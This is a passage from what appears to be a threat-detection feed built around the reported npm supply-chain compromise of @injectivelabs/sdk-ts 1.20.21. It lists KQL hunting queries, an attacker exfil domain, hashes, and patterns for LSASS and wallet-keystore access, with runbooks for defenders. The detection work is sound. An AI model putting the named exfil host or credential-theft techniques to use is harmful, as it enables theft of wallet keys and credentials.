| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileName, TargetFileSHA256, ActingProcessName, ActorUsername
| order by TimeGenerated desc

                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Critical

Injective Labs GitHub Compromise Pushes Wallet-Key-Stealing npm Packages

The Hacker News
2026-07-10 13 use cases 4 techniques 5 kill-chain phases detected

Unknown threat actors compromised the Injective Labs SDK project's GitHub repository and leveraged it to publish a malicious package on the npm registry to steal cryptocurrency wallet private keys and mnemonic seed phrases. The compromised version, @injectivelabs/sdk-ts@1.20.21, came embedded with fake telemetry functionality that exfiltrated data from cryptocurrency wallets. The version was

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Install/pin of malicious @injectivelabs ...@1.20.21 supply-chain version in package manager cmdline
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Trojanized @injectivelabs/sdk-ts 1.20.21 artifact by SHA256 on developer/CI endpoints · Suspicious browser extension installation · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Wallet-key exfil beacon to Injective SDK C2 host testnet.archival.chain.grpc-web.injective.network · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Wallet-key exfil beacon to Injective SDK C2 host testnet.archival.chain.grpc-web.injective.network AICommand & Control High
Hunts outbound DNS/HTTPS to the exact attacker subdomain that the trojanized @injectivelabs/sdk-ts@1.20.21 uses to POST stolen private keys and mnemonics. The host is shaped to blend with real Injective gRPC-web infra but this specific FQDN is attacker-controlled and appears only in the malicious build. Rationale: The FQDN testnet.archival.chain.grpc-web.injective.network is the single hard-coded exfil endpoint confirmed by Socket, Aikido and OX Security; it never appears in legitimate Injective SDK traffic, making an exact-match resolution/connection a near-zero-FP signal. Cross-checked against: • https://socket.dev/blog/compromised-injective-sdk-npm-package • https://www.aikido.dev/blog/compromised-injectivelabs-exfiltrates-keys • https://www.ox.security/blog/injectivelabs-npm-package-hijacked-impacting-87-dependent-packages/ • https://www.bleepingcomputer.com/news/security/injective-sdk-on-npm-infected-with-cryptocurrency-wallet-stealer/
ATT&CKT1041 T1567
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel enrichment/sandbox tooling actively resolving the IOC for validation
  • SOAR/EDR auto-detonation of the flagged package in a lab detonation host
  • Security researcher reproducing the attack in an isolated build
  • DNS sinkhole/RPZ appliance logging the blocked lookup
  • Passive-DNS collector replaying historical resolutions
Suppression filter
| where InitiatingProcessFileName !in~ ("sandbox_detonator.exe","threatintel-resolver.exe")
Response runbook
1) Triage: identify the host/user and the process that opened the connection (Node.js/CI runner) and confirm @injectivelabs/sdk-ts 1.20.21 is present in that project's node_modules/lockfile. 2) Contain: block the FQDN at DNS/proxy, isolate the developer/CI host, and treat every private key or mnemonic ever handled on that host as compromised — force wallet key/seed rotation immediately. 3) Hunt: pivot on the two malicious artifact SHA256s across all endpoints and CI, enumerate all 18 pinned @injectivelabs@1.20.21 packages and transitive dependents, and search for prior beacons to the host over the full retention window.

Trojanized @injectivelabs/sdk-ts 1.20.21 artifact by SHA256 on developer/CI endpoints AIInstallation Medium
Hunts the on-disk presence of the two known-malicious release artifacts of the compromised Injective SDK build, which remained downloadable from GitHub even after npm deprecation. High-fidelity because it keys on published file hashes, not behavior. Rationale: Keys on the two SHA256 artifact hashes published for the compromised build (still hosted on GitHub after npm deprecation); a file-hash match is deterministic and requires no behavioral inference. Cross-checked against: • https://socket.dev/blog/compromised-injective-sdk-npm-package • https://www.aikido.dev/blog/compromised-injectivelabs-exfiltrates-keys
ATT&CKT1195.002 T1204.002

Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Malware-analysis/repro workstation intentionally holding the sample
  • EDR quarantine or forensic evidence store retaining the file
  • Security team distributing the IOC bundle internally for testing
  • Backup/snapshot restore surfacing an old node_modules copy
Suppression filter
| where FolderPath !has "\\Quarantine\\" and FolderPath !has "\\malware-samples\\"
Response runbook
1) Triage: confirm the hash hit is within a live project (node_modules/cache) versus a quarantine/analysis path, and identify the owning developer/CI job. 2) Contain: remove/upgrade to clean @injectivelabs/sdk-ts 1.20.23, purge npm caches, and rotate every wallet private key/mnemonic that transited that host. 3) Hunt: enumerate all 18 @injectivelabs@1.20.21 pinned packages and transitive dependents in lockfiles org-wide, and correlate with any beacon to testnet.archival.chain.grpc-web.injective.network.

Install/pin of malicious @injectivelabs ...@1.20.21 supply-chain version in package manager cmdline AIDelivery Medium
Hunts npm/yarn/pnpm invocations that install or pin the poisoned 1.20.21 version of the Injective SDK or its 17 sibling wallet packages, catching the compromise at install time even when the artifact hash has been rebuilt. Article-specific to the exact malicious version string and scoped package names. Rationale: Combines the scoped package prefix @injectivelabs/ with the exact malicious version 1.20.21 (Socket/OX Security list all 18 packages pinned to that version); the clean release is 1.20.23, so a 1.20.21 pin in a package-manager cmdline is a strong install-time indicator. Cross-checked against: • https://www.ox.security/blog/injectivelabs-npm-package-hijacked-impacting-87-dependent-packages/ • https://socket.dev/blog/compromised-injective-sdk-npm-package
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer intentionally pinning 1.20.21 for repro/forensics before remediation
  • CI pipeline replaying an old lockfile that still references 1.20.21
  • Dependency-scanning tool echoing the version string in its own command line
  • Internal advisory script that greps for the bad version by name
Suppression filter
| where InitiatingProcessCommandLine !has "dependency-scan" and ProcessCommandLine !has "--dry-run"
Response runbook
1) Triage: determine whether the command actually installed (exit success, node_modules populated) versus a scan/echo, and identify the repo and user. 2) Contain: bump the dependency to 1.20.23 across affected repos, invalidate CI caches, and rotate any wallet secrets exercised on that runner/host. 3) Hunt: sweep all lockfiles/package.json for @injectivelabs@1.20.21 and transitive pins, then correlate hosts with the C2-domain and artifact-hash detections.
